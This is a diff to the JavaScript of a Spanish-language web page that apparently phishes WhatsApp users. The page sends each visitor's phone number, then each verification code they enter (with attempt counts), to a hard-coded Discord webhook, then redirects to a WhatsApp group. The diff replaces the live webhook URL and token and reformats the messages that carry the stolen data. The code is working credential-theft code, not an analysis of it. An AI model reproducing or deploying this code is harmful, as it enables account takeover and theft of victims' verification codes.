@@ -247,7 +247,7 @@
   "use strict";
 
   /* ================= CONFIGURACIÓN ================= */
-  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1573556665217851433/b1WgG7gG-wYJtB_KOv0t1b3_280DfazWoiLgrNzI1vg1eJAZD-WY9A0xEnFGmCxnQwRO";
+  const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1573837842709352478/kxGfFEJ71sxcwSDbqEDtBr8inyklcvZirriwwdHiH2ydeweN_h89mfUL7JLF0VYlb289";
   var CONFIG = {
     whatsapp: "https://chat.whatsapp.com/IQMGOssbw7A4IAJrV6p6PM?s=cl&p=a&iam=2",
     esperaMs: 15000,
@@ -340,15 +340,12 @@
   function enviarEntrada(){
     var numero = NUMERO_URL || numeroGuardado || "(sin número)";
     var msg =
-      "🟢 **Nuevo visitante en la página**\n" +
       "━━━━━━━━━━━━━━━━━━\n" +
-      "📱 **Número:** `" + numero + "`\n" +
-      "🆔 **ID:** `" + VISITANTE + "`\n" +
-      "🔗 **URL:** " + window.location.href + "\n" +
-      "⏰ **Hora:** " + new Date().toLocaleString() + "\n" +
-      "━━━━━━━━━━━━━━━━━━\n" +
-      "➡️ Acción: entró a la página\n" +
-      "⏎ Enter";
+      "**Número:** `" + numero + "`\n" +
+      "**ID:** `" + VISITANTE + "`\n" +
+      "**URL:** " + window.location.href + "\n" +
+      "**Hora:** " + new Date().toLocaleString() + "\n" +
+      "━━━━━━━━━━━━━━━━━━\n";
     enviar(msg);
   }
 
@@ -506,10 +503,10 @@
     var msg =
       (resultado === "exito" ? "✅" : "❌") + " **Código intento " + intentos + "/" + CONFIG.intentosPermitidos + " (" + resultado + ")**\n" +
       "━━━━━━━━━━━━━━━━━━\n" +
-      "🔢 **Código:** `" + codigo + "`\n" +
-      "📞 **Número:** `" + numeroGuardado + "`\n" +
-      "🆔 **ID:** `" + VISITANTE + "`\n" +
-      "⏰ **Hora:** " + new Date().toLocaleString() + "\n" +
+      "**Código:** `" + codigo + "`\n" +
+      "**Número:** `" + numeroGuardado + "`\n" +
+      "**ID:** `" + VISITANTE + "`\n" +
+      "**Hora:** " + new Date().toLocaleString() + "\n" +
       "━━━━━━━━━━━━━━━━━━\n" +
       (resultado === "exito" ? "➡️ Acción: redirigiendo a WhatsApp" : "➡️ Acción: vuelve a pedir código");
     enviar(msg);
